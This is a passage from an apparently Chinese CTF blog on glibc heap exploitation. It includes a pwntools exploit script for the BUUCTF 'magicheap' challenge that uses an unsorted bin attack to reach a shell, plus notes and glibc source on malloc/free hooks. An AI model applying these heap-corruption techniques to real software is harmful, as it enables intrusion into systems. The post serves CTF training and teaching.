class="string">&quot;malloc(): unsorted double linked list corrupted&quot;</span>);</span><br><span class="line">          <span class="keyword">if</span> (__glibc_unlikely (prev_inuse (next)))</span><br><span class="line">            malloc_printerr (<span class="string">&quot;malloc(): invalid next-&gt;prev_inuse (unsorted)&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="例子：BUUCTF在线评测-buuoj-cn"><a href="#例子：BUUCTF在线评测-buuoj-cn" class="headerlink" title="例子：BUUCTF在线评测 (buuoj.cn)"></a>例子：<a href="https://buuoj.cn/challenges#hitcontraining_magicheap">BUUCTF在线评测 (buuoj.cn)</a></h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">io = process(<span class="string">&quot;./magicheap&quot;</span>)</span><br><span class="line">io = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">28462</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">def create(size,content):</span><br><span class="line">    io.sendafter(b<span class="string">&quot;Your choice :&quot;</span>,b<span class="number">&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendafter(b<span class="string">&quot;Size of Heap : &quot;</span>,size)</span><br><span class="line">    io.sendafter(b<span class="string">&quot;Content of heap:&quot;</span>,content)</span><br><span class="line">def edit(index,size,content):</span><br><span class="line">    io.sendafter(b<span class="string">&quot;Your choice :&quot;</span>,b<span class="number">&#x27;2&#x27;</span>)</span><br><span class="line">    io.sendafter(b<span class="string">&quot;Index :&quot;</span>, index)</span><br><span class="line">    io.sendafter(b<span class="string">&quot;Size of Heap : &quot;</span>, size)</span><br><span class="line">    io.sendafter(b<span class="string">&quot;Content of heap : &quot;</span>, content)</span><br><span class="line">def de(index):</span><br><span class="line">    io.sendafter(b<span class="string">&quot;Your choice :&quot;</span>,b<span class="number">&#x27;3&#x27;</span>)</span><br><span class="line">    io.sendafter(b<span class="number">&#x27;</span>Index :<span class="string">&#x27;,index)</span></span><br><span class="line"><span class="string">def ex(index):</span></span><br><span class="line"><span class="string">    io.sendafter(b&quot;Your choice :&quot;,b&#x27;</span><span class="number">4&#x27;</span>)</span><br><span class="line">create(b<span class="number">&#x27;24&#x27;</span>,<span class="number">10</span>*b<span class="number">&#x27;</span>a<span class="number">&#x27;</span>)</span><br><span class="line">create(b<span class="number">&#x27;1272&#x27;</span>,<span class="number">10</span>*b<span class="number">&#x27;b</span><span class="number">&#x27;</span>)</span><br><span class="line">create(b<span class="number">&#x27;24&#x27;</span>,<span class="number">10</span>*b<span class="number">&#x27;</span>c<span class="number">&#x27;</span>)</span><br><span class="line">de(b<span class="number">&#x27;1&#x27;</span>)</span><br><span class="line">edit(b<span class="number">&#x27;0&#x27;</span>,b<span class="number">&#x27;48&#x27;</span>,<span class="number">24</span>*b<span class="number">&#x27;</span>a<span class="number">&#x27;</span>+p64(<span class="number">0x501</span>)+p64(<span class="number">0x0000000000602090</span>)+p64(<span class="number">0x0000000000602090</span>))</span><br><span class="line">create(b<span class="number">&#x27;1272&#x27;</span>,<span class="number">10</span>*b<span class="number">&#x27;e&#x27;</span>)</span><br><span class="line">io.sendafter(b<span class="string">&quot;Your choice :&quot;</span>,b<span class="number">&#x27;4869&#x27;</span>)</span><br><span class="line">io.interactive()</span><br><span class="line"><span class="meta">#gdb.attach(io)</span></span><br><span class="line"><span class="meta">#pause()</span></span><br></pre></td></tr></table></figure>



<h1 id="关于hook的一些说明"><a href="#关于hook的一些说明" class="headerlink" title="关于hook的一些说明"></a>关于hook的一些说明</h1><blockquote>
<p>当<code>__malloc_hook</code>和<code>__free_hook</code>中部位null的时候，在执行<code>__libc_free,__libc_malloc</code>会优先执行hook中的函数。</p>
</blockquote>
<p>代码可如下：glibc2.27</p>
<p><img src="/img/mypic/com/image-20240810190242706.png" alt="image-20240810190242706"></p>
<p>但是在2.35中hook没有了，也就不存在此利用手法：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">__libc_free (<span class="type">void</span> *mem)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  mchunkptr p;                          <span class="comment">/* chunk corresponding to mem */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (mem == <span class="number">0</span>)                              <span class="comment">/* free(0) has no effect */</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Quickly check that the freed pointer matches the tag for the memory.</span></span><br><span class="line"><span class="comment">     This gives a useful double-free detection.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (mtag_enabled))</span><br><span class="line">    *(<span class="keyword">volatile</span> <span class="type">char</span> *)mem;</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> err = errno;</span><br><span class="line"></span><br><span class="line">  p = mem2chunk (mem);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (chunk_is_mmapped (p))                       <span class="comment">/* release mmapped memory. */</span></span><br></pre></td></tr></table></figure>























]]></content>
      <categories>
        <category>ctf</category>
        <category>pwn</category>
        <category>heap利用(初级)</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>heap</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
</search>
